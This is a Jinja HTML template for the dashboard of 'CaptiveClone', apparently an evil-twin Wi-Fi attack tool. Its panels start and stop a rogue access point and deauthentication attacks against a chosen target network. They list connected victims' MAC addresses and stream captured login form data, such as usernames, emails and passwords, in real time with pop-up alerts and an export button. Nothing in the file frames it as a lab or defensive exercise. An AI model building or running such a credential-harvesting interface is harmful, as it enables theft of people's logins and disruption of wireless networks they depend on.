{% extends "base.html" %}

{% block title %}Dashboard - CaptiveClone{% endblock %}

{% block head %}
<style>
    .dashboard-card {
        height: 100%;
    }
    .status-indicator {
        width: 12px;
        height: 12px;
        border-radius: 50%;
        display: inline-block;
        margin-right: 5px;
    }
    .status-active {
        background-color: #28a745;
    }
    .status-inactive {
        background-color: #dc3545;
    }
    .credential-item {
        border-left: 4px solid #dc3545;
        padding-left: 10px;
        margin-bottom: 10px;
        animation: fadeIn 0.5s;
    }
    .client-item {
        padding: 5px;
        margin-bottom: 5px;
        border-radius: 4px;
        background-color: #f8f9fa;
    }
    .client-item:hover {
        background-color: #e9ecef;
    }
    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(-10px); }
        to { opacity: 1; transform: translateY(0); }
    }
    .credential-time {
        font-size: 0.8rem;
        color: #6c757d;
    }
    .credential-ip {
        font-weight: bold;
    }
    .credential-field {
        display: inline-block;
        padding: 2px 6px;
        margin: 2px;
        background-color: #f1f1f1;
        border-radius: 4px;
        font-size: 0.85rem;
    }
    .notification {
        position: fixed;
        top: 70px;
        right: 20px;
        width: 300px;
        background-color: #343a40;
        color: white;
        padding: 15px;
        border-radius: 5px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        z-index: 1000;
        animation: slideIn 0.3s, fadeOut 0.5s 4s forwards;
        display: none;
    }
    @keyframes slideIn {
        from { transform: translateX(100%); }
        to { transform: translateX(0); }
    }
    @keyframes fadeOut {
        from { opacity: 1; }
        to { opacity: 0; }
    }
</style>
{% endblock %}

{% block content %}
<div class="row">
    <div class="col-md-12">
        <h2><i class="fas fa-tachometer-alt"></i> Dashboard</h2>
        <p class="lead">Monitor attack status, connected clients, and captured credentials.</p>
    </div>
</div>

<div class="row mt-4">
    <div class="col-md-4">
        <div class="card dashboard-card mb-4">
            <div class="card-header bg-dark text-white">
                <h5 class="mb-0"><i class="fas fa-server"></i> System Status</h5>
            </div>
            <div class="card-body">
                <ul class="list-group">
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        Access Point
                        <span class="badge {% if ap_running %}bg-success{% else %}bg-danger{% endif %}">
                            {% if ap_running %}Active{% else %}Inactive{% endif %}
                        </span>
                    </li>
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        Deauthentication
                        <span class="badge {% if deauth_running %}bg-success{% else %}bg-danger{% endif %}">
                            {% if deauth_running %}Active{% else %}Inactive{% endif %}
                        </span>
                    </li>
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        Credential Capture
                        <span class="badge {% if capture_running %}bg-success{% else %}bg-danger{% endif %}">
                            {% if capture_running %}Active{% else %}Inactive{% endif %}
                        </span>
                    </li>
                </ul>

                <div class="mt-3">
                    {% if not ap_running %}
                    <a href="{{ url_for('access_point') }}" class="btn btn-sm btn-outline-primary">
                        <i class="fas fa-broadcast-tower"></i> Start Access Point
                    </a>
                    {% else %}
                    <form action="{{ url_for('stop_ap') }}" method="post" class="d-inline">
                        <button type="submit" class="btn btn-sm btn-outline-danger">
                            <i class="fas fa-stop"></i> Stop Access Point
                        </button>
                    </form>
                    {% endif %}
                    
                    {% if not deauth_running %}
                    <a href="{{ url_for('deauthenticate') }}" class="btn btn-sm btn-outline-primary">
                        <i class="fas fa-user-slash"></i> Start Deauth
                    </a>
                    {% else %}
                    <form action="{{ url_for('stop_deauth') }}" method="post" class="d-inline">
                        <button type="submit" class="btn btn-sm btn-outline-danger">
                            <i class="fas fa-stop"></i> Stop Deauth
                        </button>
                    </form>
                    {% endif %}
                </div>
            </div>
        </div>

        <div class="card dashboard-card">
            <div class="card-header bg-dark text-white">
                <h5 class="mb-0"><i class="fas fa-wifi"></i> Target Network</h5>
            </div>
            <div class="card-body">
                {% if target_network %}
                <h5>{{ target_network.ssid }}</h5>
                <ul class="list-unstyled">
                    <li><strong>BSSID:</strong> {{ target_network.bssid }}</li>
                    <li><strong>Channel:</strong> {{ target_network.channel }}</li>
                    <li><strong>Encryption:</strong> {{ target_network.encryption or 'Open' }}</li>
                    <li><strong>Signal:</strong> {{ target_network.signal_strength }}%</li>
                </ul>
                {% else %}
                <p class="text-muted">No target network selected.</p>
                <a href="{{ url_for('scan') }}" class="btn btn-sm btn-outline-primary">
                    <i class="fas fa-search"></i> Scan Networks
                </a>
                {% endif %}
            </div>
        </div>
    </div>

    <div class="col-md-4">
        <div class="card dashboard-card">
            <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">
                <h5 class="mb-0"><i class="fas fa-users"></i> Connected Clients</h5>
                <span class="badge bg-primary" id="client-count">{{ clients|length }}</span>
            </div>
            <div class="card-body">
                <div id="clients-container" style="max-height: 400px; overflow-y: auto;">
                    {% if clients %}
                    {% for mac, client in clients.items() %}
                    <div class="client-item" data-mac="{{ mac }}">
                        <div class="d-flex justify-content-between">
                            <div>
                                <strong>{{ mac }}</strong>
                                <div class="text-muted small">
                                    {{ client.packets }} packets
                                </div>
                            </div>
                            <div>
                                <span class="badge bg-secondary" title="Last seen {{ client.last_seen }}">
                                    Active
                                </span>
                            </div>
                        </div>
                    </div>
                    {% endfor %}
                    {% else %}
                    <div class="text-center text-muted py-5" id="no-clients-message">
                        <i class="fas fa-users fa-3x mb-3"></i>
                        <p>No clients connected yet.</p>
                    </div>
                    {% endif %}
                </div>
            </div>
            <div class="card-footer bg-light">
                <div class="form-check">
                    <input class="form-check-input" type="checkbox" id="autorefresh" checked>
                    <label class="form-check-label" for="autorefresh">
                        Auto-refresh (5s)
                    </label>
                </div>
            </div>
        </div>
    </div>

    <div class="col-md-4">
        <div class="card dashboard-card">
            <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">
                <h5 class="mb-0"><i class="fas fa-key"></i> Captured Credentials</h5>
                <span class="badge bg-danger" id="credential-count">{{ credentials|length }}</span>
            </div>
            <div class="card-body">
                <div id="credentials-container" style="max-height: 400px; overflow-y: auto;">
                    {% if credentials %}
                    {% for cred in credentials %}
                    <div class="credential-item">
                        <div class="credential-time">{{ cred.timestamp }}</div>
                        <div class="credential-ip">{{ cred.source_ip }} ({{ cred.portal }})</div>
                        <div class="credential-data">
                            {% for field, value in cred.form_data.items() %}
                            <div class="credential-field">
                                <strong>{{ field }}:</strong> {{ value }}
                            </div>
                            {% endfor %}
                        </div>
                    </div>
                    {% endfor %}
                    {% else %}
                    <div class="text-center text-muted py-5" id="no-credentials-message">
                        <i class="fas fa-key fa-3x mb-3"></i>
                        <p>No credentials captured yet.</p>
                    </div>
                    {% endif %}
                </div>
            </div>
            <div class="card-footer bg-light">
                <a href="{{ url_for('view_credentials') }}" class="btn btn-sm btn-outline-primary">
                    <i class="fas fa-list"></i> View All
                </a>
                <form action="{{ url_for('export_credentials') }}" method="post" class="d-inline">
                    <button type="submit" class="btn btn-sm btn-outline-secondary">
                        <i class="fas fa-download"></i> Export
                    </button>
                </form>
            </div>
        </div>
    </div>
</div>

<div id="notification" class="notification">
    <strong><i class="fas fa-key"></i> New Credential Captured!</strong>
    <p id="notification-content"></p>
</div>
{% endblock %}

{% block scripts %}
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
<script>
    document.addEventListener('DOMContentLoaded', function() {
        // Connect to Socket.IO server
        const socket = io();
        const clientsContainer = document.getElementById('clients-container');
        const credentialsContainer = document.getElementById('credentials-container');
        const clientCount = document.getElementById('client-count');
        const credentialCount = document.getElementById('credential-count');
        const noClientsMessage = document.getElementById('no-clients-message');
        const noCredentialsMessage = document.getElementById('no-credentials-message');
        const notification = document.getElementById('notification');
        const notificationContent = document.getElementById('notification-content');
        
        // Function to display a notification
        function showNotification(message) {
            notificationContent.textContent = message;
            notification.style.display = 'block';
            
            // Hide notification after 5 seconds
            setTimeout(() => {
                notification.style.display = 'none';
            }, 5000);
        }
        
        // Update client list when received from server
        socket.on('client_update', function(clients) {
            // Clear existing clients
            clientsContainer.innerHTML = '';
            
            // Update client count
            const count = Object.keys(clients).length;
            clientCount.textContent = count;
            
            if (count === 0) {
                // Show no clients message
                clientsContainer.innerHTML = `
                    <div class="text-center text-muted py-5">
                        <i class="fas fa-users fa-3x mb-3"></i>
                        <p>No clients connected yet.</p>
                    </div>
                `;
            } else {
                // Hide no clients message if it exists
                if (noClientsMessage) {
                    noClientsMessage.style.display = 'none';
                }
                
                // Add each client
                for (const [mac, client] of Object.entries(clients)) {
                    const clientEl = document.createElement('div');
                    clientEl.className = 'client-item';
                    clientEl.setAttribute('data-mac', mac);
                    
                    // Format last seen time
                    const lastSeen = new Date(client.last_seen * 1000).toLocaleTimeString();
                    
                    clientEl.innerHTML = `
                        <div class="d-flex justify-content-between">
                            <div>
                                <strong>${mac}</strong>
                                <div class="text-muted small">
                                    ${client.packets} packets
                                </div>
                            </div>
                            <div>
                                <span class="badge bg-secondary" title="Last seen ${lastSeen}">
                                    Active
                                </span>
                            </div>
                        </div>
                    `;
                    
                    clientsContainer.appendChild(clientEl);
                }
            }
        });
        
        // Handle new credentials
        socket.on('new_credential', function(credential) {
            // Hide no credentials message if it exists
            if (noCredentialsMessage) {
                noCredentialsMessage.style.display = 'none';
            }
            
            // Create credential element
            const credEl = document.createElement('div');
            credEl.className = 'credential-item';
            
            // Format timestamp
            const timestamp = new Date(credential.timestamp).toLocaleTimeString();
            
            // Create HTML content
            let formDataHtml = '';
            for (const [field, value] of Object.entries(credential.form_data)) {
                formDataHtml += `
                    <div class="credential-field">
                        <strong>${field}:</strong> ${value}
                    </div>
                `;
            }
            
            credEl.innerHTML = `
                <div class="credential-time">${timestamp}</div>
                <div class="credential-ip">${credential.source_ip} (${credential.portal})</div>
                <div class="credential-data">
                    ${formDataHtml}
                </div>
            `;
            
            // Add to container
            credentialsContainer.insertBefore(credEl, credentialsContainer.firstChild);
            
            // Update credential count
            const count = parseInt(credentialCount.textContent) + 1;
            credentialCount.textContent = count;
            
            // Show notification
            let notifMessage = `From ${credential.source_ip}`;
            // Add username/password if available
            if (credential.form_data.username) {
                notifMessage += ` - User: ${credential.form_data.username}`;
            } else if (credential.form_data.email) {
                notifMessage += ` - Email: ${credential.form_data.email}`;
            }
            showNotification(notifMessage);
            
            // Play notification sound
            const audio = new Audio('/static/sounds/notification.mp3');
            audio.play().catch(e => console.log('Audio play failed:', e));
        });
        
        // Connection status events
        socket.on('connect', function() {
            console.log('Connected to server');
        });
        
        socket.on('disconnect', function() {
            console.log('Disconnected from server');
        });
    });
</script>
{% endblock %} 